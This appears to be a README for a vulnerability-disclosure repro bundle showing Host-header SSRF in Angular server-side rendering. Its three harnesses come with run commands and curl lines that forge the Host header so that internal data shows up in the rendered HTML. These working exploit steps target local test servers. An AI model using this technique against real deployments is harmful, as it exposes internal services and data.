# Standalone SSRF Repro Bundle

This bundle provides **three harnesses** that demonstrate the same SSRF behavior with different levels of realism and dependencies.

## Harness A — Standalone (no Angular repo required)
**Purpose:** Minimal, self‑contained repro using only published @angular/* packages.  
**Shows:** Host‑header‑derived SSR base causes a relative SSR HttpClient call to hit an internal host and return data into HTML.

### Install
```bash
npm install
```

### Run
```bash
npm run start
```

This starts:
- Internal server: http://127.0.0.1:4401/secret
- SSR server: http://127.0.0.1:4400/

### Exploit demo
```bash
curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4400/
```

Expected outcome:
- HTML includes `INTERNAL_SECRET_123`.
- Demonstrates SSR‑time data exfiltration into HTML (not just a “request‑only” SSRF).

---

## Harness B — Minimal SSR app (uses same dependencies)
**Location:** `harnesses/ssrf-ssr-app`  
**Purpose:** A slightly more Angular‑idiomatic repro that mirrors the original minimal app structure.  
**Shows:** Same Host‑header SSRF behavior; useful for code‑path clarity.

### Run (from this folder)
```bash
npm run run:minimal
```

Expected outcome:
- HTML includes `INTERNAL_SECRET_123` when the Host header is set to 127.0.0.1:4401.

---

## Harness C — Stock Angular SSR example (ngmodule)
**Location:** `harnesses/ssrf-stock-ngmodule`  
**Purpose:** Demonstrates exploitability in Angular’s **stock ngmodule SSR example**.  
**Shows:** The example server builds SSR URL from `headers.host`, so a relative `/api-2` request is steered to an internal host.

### Requirements
- An Angular repo checkout (any recent main branch or release branch). This bundle does not include the Angular repo.

### Run (outline)
```bash
export ANGULAR_REPO=/path/to/angular
corepack pnpm -C "$ANGULAR_REPO/integration/platform-server" install
corepack pnpm -C "$ANGULAR_REPO/integration/platform-server" build:ngmodule
corepack pnpm -C "$ANGULAR_REPO/integration/platform-server" serve:ngmodule
```

In another terminal (this bundle):
```bash
npm run run:stock:api
```

Exploit:
```bash
curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4206/http-transferstate-lazy
```

Expected outcome:
- HTML includes `INTERNAL_SECRET_123` in the `.two` div.

---

## What these harnesses show
- **Header‑derived SSR base URL** allows attacker‑chosen internal targets.
- **Relative SSR HttpClient** requests are rewritten to that base.
- **Internal data is returned in HTML**, demonstrating real impact.
